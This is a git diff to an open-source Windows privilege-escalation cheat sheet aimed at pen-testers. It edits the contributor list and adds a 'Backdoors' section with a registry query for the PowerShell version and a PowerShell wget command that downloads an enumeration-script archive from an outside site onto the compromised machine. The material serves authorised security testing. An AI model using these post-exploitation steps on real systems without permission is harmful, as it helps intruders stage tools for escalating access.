@@ -1,14 +1,15 @@
 # About this document
 This document is an open source markdown document that can be contributed to via github.
-If you see a typo, an improvment to add, or a vector that I missed please send a pull request to the master brunch via the 
-[repo link](https://github.com/AddaxSoft/OSWindowsPrivEscalation) and I will review it and approve if approperiate.
+If you see a typo, a bug or a mistake, an improvment, or a vector that we've missed please send me a pull request to the master brunch via the 
+[repo link](https://github.com/AddaxSoft/OSWindowsPrivEscalation) and I will review it and approve if approperiate asap.
 
 This document is meant for pen-testers, red teams, and the like.
 
 ** Needless to state: You're responosible for what you're doing :-)
 
 # Contributors
-- AK | [amAK.xyz](https://imAK.xyz)
+- AK | Author and Maintainer [amAK.xyz](https://imAK.xyz), [@xxByte](https://twitter.com/xxByte)
+- You | Your Contribution [yourTwitter](https://twitter.com/xxByte)
 
 ------
 Let's get to it!
@@ -138,6 +139,16 @@ Which processes are running as "system"
 
     tasklist /v /fi "username eq system"
 
+# Backdoors
+You've learned as much as you can about the system, now you will need to upload files to it for executing local exploits or running scripts that can enumirate services, schedules, and find weakness better than you.
+
+## Do you have powershell magic?
+
+    REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
+
+## wget via PowerShell
+
+    powershell -Noninteractive -NoProfile -command "wget https://addaxsoft.com/download/wpecs-scripts.zip -UseBasicParsing -OutFile scripts.zip"
 
 -----
 
